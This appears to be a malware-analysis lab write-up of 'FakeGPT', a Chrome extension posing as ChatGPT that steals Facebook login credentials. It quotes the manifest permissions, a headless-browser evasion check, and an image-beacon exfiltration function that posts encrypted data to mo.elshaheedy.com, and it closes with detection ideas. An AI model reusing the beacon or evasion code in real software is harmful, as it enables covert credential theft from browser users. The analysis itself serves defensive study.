FakeGPT Lab — Malicious Chrome Extension Analysis

A browser-extension malware investigation focused on suspicious permissions, staged loading, anti-analysis checks, credential harvesting, keylogging, AES encryption, and covert exfiltration through an HTML image beacon.

1. Executive Summary

The analyzed Chrome extension pretends to be an AI assistant named ChatGPT, but its code shows behavior consistent with a credential stealer and keylogger. The extension targets www.facebook.com, captures submitted login credentials, records keystrokes, encrypts collected data with AES, and exfiltrates the payload to a remote domain using a covert <img> request.

Key finding: the popup page is only a decoy. The malicious behavior is implemented in the JavaScript files loaded through the extension manifest and background/content scripts.

3. Manifest Analysis

The manifest defines permissions and execution entry points. This extension requests broad browser access, including cookies, tabs, web requests, and access to all HTTP/HTTPS pages.

"permissions": [
  "tabs", "http://*/*", "https://*/*", "storage", "webRequest", "webRequestBlocking", "cookies"
]

The declared background script is system/loader.js, and the content script is core/app.js with <all_urls> matching. This means the content script can run on every visited website.

Assessment: for a simple AI helper extension, permissions such as cookies, webRequestBlocking, and all HTTP/HTTPS host access are highly suspicious.

4. Decoy Popup UI

The popup page presents a harmless ChatGPT-themed interface. It claims the extension helps generate text using AI and even warns about fake versions. No meaningful AI functionality is present in this UI.

5. Loader Script & Anti-analysis

The loader checks for signs of an automated or headless browser environment and then dynamically loads the core script.

if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
  alert("Virtual environment detected. Extension will disable itself.");
}

The first deactivation condition is navigator.plugins.length === 0. The script also checks for HeadlessChrome in the User-Agent.

6. Crypto Routine

The extension uses CryptoJS to encrypt data before exfiltration. The routine applies AES with a hardcoded key and a random IV, then encodes the final output as Base64.

7. Credential Theft & Keylogging

The core content script hides its target domain using Base64. The encoded string d3d3LmZhY2Vib29rLmNvbQ== decodes to www.facebook.com.

This is form grabbing: the extension captures submitted username/email and password values from the login form. The keydown listener records individual keystrokes.

8. Covert Exfiltration via IMG Beacon

The exfiltration function creates a new image element and assigns the remote collection URL to its src attribute. When the browser tries to load the image, it sends a GET request to the attacker-controlled domain with the encrypted data in the query string.

function sendToServer(encryptedData) {
  var img = new Image();
  img.src = 'https://mo.elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
  document.body.appendChild(img);
}

Detection Ideas

  • Alert on browser extensions requesting cookies, webRequestBlocking, and broad host permissions.
  • Monitor DNS/HTTP requests to mo.elshaheedy.com.
  • Hunt for JavaScript patterns such as new Image() combined with sensitive data parameters.
  • Review extensions that register submit and keydown listeners on high-value login pages.
  • Look for CryptoJS AES usage with hardcoded keys in browser extension source code.

11. Conclusion

FakeGPT is a malicious browser extension disguised as an AI assistant. Its manifest grants excessive permissions, the loader includes anti-analysis checks, and the core script targets Facebook login activity. The extension harvests submitted credentials, records keystrokes, encrypts the collected data with AES, and exfiltrates it through a covert <img> beacon to mo.elshaheedy.com.

Analyst takeaway: always start extension analysis from manifest.json, follow the declared scripts, identify event listeners, decode hidden strings, and trace how collected data leaves the browser.
